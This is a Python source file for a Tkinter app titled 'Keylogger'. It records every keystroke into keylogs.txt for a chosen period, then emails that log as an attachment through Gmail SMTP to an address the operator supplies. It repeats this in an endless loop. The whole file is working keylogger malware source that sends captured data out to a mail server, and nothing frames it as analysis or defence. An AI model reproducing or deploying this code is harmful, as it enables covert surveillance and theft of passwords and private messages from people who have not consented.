from tkinter import *
from pynput.keyboard import Listener
from threading import Thread
import logging
import time


import smtplib
import ssl

from email import encoders
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import threading


class MyWindow:
    def __init__(self, win):
        self.lbl0 = Label(
            win, text='Note:  You need to create an App Password on your Google Account as this application doesn’t have “Sign in with Google.”')
        self.lbl1 = Label(win, text='Sender Mail')
        self.lbl2 = Label(win, text='Password')
        self.lbl3 = Label(win, text='Receiver Mail')
        self.lbl4 = Label(win, text='Timer(seconds)')
        self.lbl5 = Label(win, text='Result')
        self.lbl6 = Label(win, text='Made with ❤️')
        self.t1 = Entry(bd=3)
        self.t2 = Entry()
        self.t3 = Entry()
        self.t4 = Entry()
        self.t5 = Entry()
        self.btn1 = Button(win, text='Add')
        self.btn2 = Button(win, text='Subtract')
        self.lbl0.place(x=100, y=50)
        self.lbl1.place(x=100, y=100)
        self.t1.place(x=200, y=100, width=400)
        self.lbl2.place(x=100, y=150)
        self.t2.place(x=200, y=150, width=400)
        self.lbl3.place(x=100, y=200)
        self.t3.place(x=200, y=200, width=400)
        self.lbl4.place(x=100, y=250)
        self.t4.place(x=200, y=250, width=400)

        self.b1 = Button(win, text='Submit',
                         command=threading.Thread(target=self.sub).start)

        self.b1.place(x=200, y=300)
        self.lbl5.place(x=100, y=350)
        self.t5.place(x=200, y=350, width=400)
        self.lbl6.place(x=100, y=450)

    def sub(self):
        self.t5.insert('end', 'Keylogger started\t')

        def bar():
            self.t5.insert('end', 'Listening...\t')

            log_dir = ""

            logging.basicConfig(
                filename=(log_dir + "keylogs.txt"),
                level=logging.DEBUG,
                format="%(asctime)s: %(message)s",
            )

            def on_press(key):
                logging.info(str(key))

            with Listener(on_press=on_press) as ls:
                def time_out(period_sec: int):
                    # Listen to keyboard for period_sec seconds
                    time.sleep(period_sec)
                    ls.stop()
                timer = float(self.t4.get())
                Thread(target=time_out, args=(timer,)).start()
                ls.join()

        def send_mail():
            subject = "An email with keylogs attached"
            body = "This is an email with attachment from keylogger"
            sender_email = self.t1.get()
            receiver_email = self.t3.get()
            password = self.t2.get()

            # Create a multipart message and set headers
            message = MIMEMultipart()
            message["From"] = sender_email
            message["To"] = receiver_email
            message["Subject"] = subject
            message["Bcc"] = receiver_email  # Recommended for mass emails

            # Add body to email
            message.attach(MIMEText(body, "plain"))

            filename = "keylogs.txt"  # In same directory as script

            # Open file in binary mode
            with open(filename, "rb") as attachment:
                # Add file as application/octet-stream
                # Email client can usually download this automatically as attachment
                part = MIMEBase("application", "octet-stream")
                part.set_payload(attachment.read())

            # Encode file in ASCII characters to send by email
            encoders.encode_base64(part)

            # Add header as key/value pair to attachment part
            part.add_header(
                "Content-Disposition",
                f"attachment; filename= {filename}",
            )

            # Add attachment to message and convert message to string
            message.attach(part)
            text = message.as_string()

            # Log in to server using secure context and send email
            context = ssl.create_default_context()
            with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=context) as server:
                server.login(sender_email, password)
                server.sendmail(sender_email, receiver_email, text)

            self.t5.insert('end', 'Email Sent\t')
            #self.t5.delete(0, 'end')

        while (True):
            bar()
            send_mail()


window = Tk()
mywin = MyWindow(window)
window.title('Keylogger')
window.geometry("800x500+10+10")
window.mainloop()
